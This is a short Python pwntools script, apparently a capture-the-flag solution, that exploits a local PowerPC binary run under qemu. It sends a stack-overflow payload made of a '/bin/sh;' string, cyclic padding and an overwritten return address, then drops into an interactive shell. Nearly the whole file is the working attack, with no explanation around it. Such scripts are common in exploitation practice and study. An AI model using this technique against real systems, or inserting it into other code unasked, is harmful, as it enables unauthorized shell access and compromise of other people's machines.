from pwn import *
context.endian = 'big'
local = 1
if local:
    sh = process(['qemu-ppc-static', '-g', '4444', './main'])
else:
    sh = process(['qemu-ppc-static', './main'])

payload = b'/bin/sh;caaadaaaeaaafaaagaaahaaaiaaajaaa' + p32(0x10000694)
#pause()
sh.sendlineafter(b'comment.\n', payload)
sh.interactive()